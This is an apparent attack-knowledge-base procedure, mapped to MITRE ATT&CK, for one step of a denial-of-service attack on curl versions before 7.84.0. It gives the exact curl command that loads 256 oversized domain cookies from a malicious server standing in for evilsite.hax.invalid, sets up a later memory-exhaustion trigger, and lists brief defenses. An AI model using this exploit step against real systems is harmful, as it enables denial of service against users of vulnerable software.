---
id: proc-2
tags:
  - curl
  - cookies
  - dos
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-populate-cookies]]'
verified: false
platforms:
  - Linux
  - Unix-like
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.122Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Populate-Cookie-Jar-with-Domain-Cookies-Using-curl

## Summary

This procedure uses curl to request a proxied malicious endpoint, saving excessive domain-wide cookies to a file, which will later be loaded to trigger memory issues in curl.

## Description

Exploiting curl's cookie mechanism, this step fetches from evilsite.hax.invalid (redirected to local server) using --connect-to, saving Set-Cookie headers to cookie.txt. The cookies are domain-scoped (hax.invalid), allowing application to other subdomains. This populates the jar without immediate DoS, setting up the final trigger.

## Requirements

1. Running malicious server from previous procedure on 127.0.0.1:9000
2. Vulnerable curl version (<7.84.0)
3. Writable directory for cookie.txt

## Defense

Defensive measures and detection strategies:

- Limit cookie sizes and counts in client configurations
- Monitor curl usage for unusual proxying (--connect-to)
- Validate cookie domains in network traffic

## Objectives

1. Store 256 large domain cookies in jar
2. Ensure cookies apply across subdomains
3. Prepare for memory exhaustion in next step

## Instructions

### Step 1: Execute curl to Save Cookies

**Context**: Use curl with cookie jar management to receive and store the excessive cookies from the proxied server.

**Command** ([[commands/curl-populate-cookies]]):
```bash
curl -c cookie.txt -b cookie.txt --connect-to evilsite.hax.invalid:80:127.0.0.1:9000 http://evilsite.hax.invalid/
```

> This command loads/saves cookies via -b/-c and redirects the host to local server. Expected output: Server's HTML response; cookie.txt updated with 256 entries like #HttpOnly_hax.invalid	TRUE	/	FALSE	0	f0	AAAA... (4092 A's).

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-populate-cookies]]

## Tools Used

- [[tools/curl]]

## Tags

- curl
- cookies
- dos
